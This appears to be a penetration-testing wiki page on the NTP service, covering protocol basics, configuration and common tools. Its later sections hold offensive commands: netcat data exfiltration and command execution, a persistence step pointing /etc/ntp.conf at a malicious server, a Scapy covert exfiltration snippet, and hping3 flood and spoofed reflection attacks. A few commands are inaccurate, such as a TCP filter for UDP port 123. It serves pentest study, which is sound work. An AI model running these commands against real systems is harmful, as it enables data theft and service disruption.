# Index
- [[Ports, Protocols, and Services]]

# Network Time Protocol (NTP)

- **Port Number:** 123
- **Protocol:** UDP
- **Service Name:** Network Time Protocol (NTP)
- **Defined in:** RFC 5905

Network Time Protocol (NTP) is a networking protocol designed to synchronize the clocks of computers over a network. NTP can achieve time synchronization with millisecond precision in local networks and better than one second accuracy over the internet. NTP is crucial for time-dependent processes such as logging, authentication, and network performance monitoring.

## Overview of Features

- **Time Synchronization:** NTP allows computers to synchronize their clocks with a reference time source, usually an atomic clock or GPS.
  
- **Hierarchy of Time Servers (Stratum Levels):** NTP uses a hierarchical system of time sources, where Stratum 0 devices (e.g., atomic clocks) serve as the reference, and Stratum 1 devices connect directly to them. Each subsequent layer (Stratum 2, Stratum 3, etc.) synchronizes with the layer above it.

- **Accuracy:** NTP can synchronize time within a few milliseconds over LAN and within tens of milliseconds over the internet. 

- **Fault Tolerance:** NTP clients can configure multiple servers to mitigate the risk of relying on a single, potentially faulty, time source.

- **Delay Calculation:** NTP includes mechanisms to calculate network delay and adjust the time accordingly, ensuring more accurate synchronization.

- **Security:** NTP has built-in security features, such as authentication mechanisms to prevent tampering with time synchronization.

## Typical Use Cases

- **System Logging:** Accurate timestamps in system logs are crucial for troubleshooting, auditing, and security monitoring.

- **Distributed Systems:** Applications in distributed systems rely on synchronized time to coordinate tasks across multiple servers.

- **Cryptographic Operations:** Time synchronization is critical for the validity of cryptographic certificates and keys.

- **Network Performance Monitoring:** Accurate time is essential for measuring and analyzing network performance metrics.

- **Telecommunications:** Ensures that events across the network are synchronized, which is vital for operations like billing and call logging.

## How NTP Protocol Works

1. **NTP Server and Client Configuration:**
   - **Step 1:** An NTP client is configured with one or more NTP servers (typically by specifying their IP addresses or domain names).
   
2. **NTP Request (Client to Server):**
   - **Step 2:** The NTP client sends a request packet to the NTP server over UDP on port 123. This packet contains the client’s timestamp, which marks the exact time the request was sent.

3. **NTP Server Response:**
   - **Step 3:** The NTP server receives the request, adds its own timestamp indicating the exact time it received the request, and sends a response back to the client.
   - **Step 4:** The server response packet includes four timestamps:
     - **Originate Timestamp:** Time the client sent the request.
     - **Receive Timestamp:** Time the server received the request.
     - **Transmit Timestamp:** Time the server sent the response.
     - **Destination Timestamp:** Time the client received the response.

4. **Time Calculation:**
   - **Step 5:** Upon receiving the response, the client calculates the round-trip delay and the local clock offset using the four timestamps. 
   - **Step 6:** The client adjusts its system clock to match the server’s time, accounting for network delays.

5. **Synchronization Interval:**
   - **Step 7:** NTP clients periodically poll the server (typically every 64 to 1024 seconds) to maintain accurate synchronization.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` sends a request to `<target_ip>`:123 with its current time.
- **Server:** `<target_ip>` responds with its current time and the timestamps from the client's request.
- **Client:** `<attack_ip>` calculates the time difference and adjusts its clock.

# Additional Information

## Stratum Levels

- **Stratum 0:** The most accurate time sources, like atomic clocks and GPS receivers. They are not directly connected to the network.
- **Stratum 1:** These are directly connected to Stratum 0 devices and serve as primary time servers.
- **Stratum 2, 3, ...:** These are secondary time servers that synchronize with Stratum 1 servers. Each lower stratum introduces a small amount of error.

## NTP Modes

- **Client-Server Mode:** The most common configuration where clients request time from a server.
- **Symmetric Mode:** Used between two NTP servers to provide mutual backup, ensuring redundancy.
- **Broadcast/Multicast Mode:** A server sends time updates to multiple clients at once, reducing network traffic in environments where many clients need to synchronize.

## Security Considerations

- **NTP Authentication:** NTP supports cryptographic authentication using symmetric keys, ensuring that only trusted servers can synchronize time with clients.
- **Mitigating Replay Attacks:** By using randomized values in each request, NTP mitigates the risk of replay attacks.
- **NTPsec:** An updated and more secure implementation of NTP, focusing on modern security requirements.

## Configuration Files

1. **NTP Configuration (Linux example):**
- **File Location:** `/etc/ntp.conf`
- **Example Configuration:**
```bash
# Use public servers from the NTP Pool Project
server 0.pool.ntp.org iburst
server 1.pool.ntp.org iburst
server 2.pool.ntp.org iburst
server 3.pool.ntp.org iburst

# Use servers from the local network
server ntp.local iburst

# Drift file to store the local clock's frequency error
driftfile /var/lib/ntp/drift

# Enable authentication
#keys /etc/ntp/keys
```
- **Key Settings:**
	- `server`: Specifies the NTP servers to synchronize with. The `iburst` option speeds up the initial synchronization.
	- `driftfile`: Stores the local clock's drift, helping NTP maintain accuracy over time.
	- `keys`: Points to the file containing authentication keys (if authentication is enabled).

## Potential Misconfigurations

1. **Incorrect Time Source Configuration:**
   - **Risk:** Configuring an NTP client to use unreliable or incorrect time servers can lead to inaccurate time synchronization.
   - **Exploitation:** An attacker could spoof an NTP server and provide incorrect time data, disrupting time-dependent processes.

2. **NTP Amplification Attack Vulnerability:**
   - **Risk:** Misconfigured NTP servers can be exploited for amplification attacks, where a small request generates a much larger response.
   - **Exploitation:** Attackers send small queries to NTP servers with a spoofed source address, causing the server to send large responses to the victim, overwhelming their network.

3. **Unfiltered NTP Service:**
   - **Risk:** Exposing NTP service to the internet without proper filtering can lead to potential abuse, including reflection attacks.
   - **Exploitation:** Attackers use NTP to gather information about network infrastructure or as part of a DDoS attack.

## Default Credentials

NTP typically does not use credentials for time synchronization. However, if NTP authentication is enabled, the credentials are defined in the configuration files using symmetric keys.

# Interaction and Tools

## Tools

### [[NTP]]
- **Check NTP Status:** Checking the synchronization status of NTP servers.
    ```bash
    ntpq -p
    ```
- **Configure NTP Drift:** Displays information about the local clock's drift, which is crucial for maintaining accurate time synchronization.
	```bash
	ntpdc -c loopinfo
	```
- **Manually Synchronize:** Manually synchronizing the system clock with an NTP server.
    ```bash
    ntpdate -u <ntp_server_ip>
    ```
- **Query NTP Server:** Queries the specified NTP server and displays the time difference without making any changes to the local clock.
	```bash
	ntpdate -q <ntp_server_ip>
	```

### [[Chrony]]
- **Query Sources:** Monitor and control time synchronization on systems using Chrony.
    ```bash
    chronyc sources
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 123"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 123
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 123
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 123 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 123
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 123 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:123
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 123 -c 1
    ```

### [[Scapy]]
- **Custom Code:** Custom packet crafting to interact with or exploit NTP services.
    ```python
    from scapy.all import *
    packet = IP(dst="<ntp_server_ip>")/UDP(dport=123)/NTP()
    response = sr1(packet)
    print(response.show())
    ```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 123
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 123
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

<br>

- **Tool:** [[ntpq]]
    ```bash
    ntpq -p <target_ip>
    ```
- **Description:** Enumerates the NTP service on the target to gather information about the time server hierarchy and stratum level.

## Persistence

### Tampering with NTP Configuration
 - **Tool:** [[Custom Scripts]]
    ```bash
    echo "server <malicious_ntp_server>" >> /etc/ntp.conf
service ntp restart
    ```
- **Description:** Altering the NTP configuration to point to a malicious server, causing persistent time drift or disruption.

## Data Exfiltration

### Covert Channels via NTP
- **Tool:** [[Scapy]], [[HPing3 Cheat Sheet]]
    ```python
    from scapy.all import *
    packet = IP(dst="<ntp_server_ip>")/UDP(dport=123)/Raw(load="exfil_data")
    send(packet)
    ```
- **Description:** Using NTP as a covert channel for data exfiltration by embedding data within NTP packets.

# Exploits and Attacks

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

## Exploits 

### NTP Monlist Exploit
- **Tool:** [[Nmap]], [[Custom Scripts]]
    ```bash
    nmap <target_ip> -p 123 -sU --script ntp-monlist 
    ```
- **Description:** Exploits the `monlist` feature of older NTP servers to retrieve a list of the last 600 clients that interacted with the server, potentially revealing sensitive information.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 5905|https://tools.ietf.org/html/rfc5905|
|NTP Pool Project|https://www.ntppool.org/en/|
|NTPsec Project|https://www.ntpsec.org/|
|NTP Documentation|http://doc.ntp.org/4.2.8/|
|Chrony Documentation|https://chrony.tuxfamily.org/doc.html|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|hping3 Manual|http://www.hping.org/manpage.html|
|Linux man-pages|https://man7.org/linux/man-pages/|
|Nmap Scripting Engine|https://nmap.org/book/nse.html|
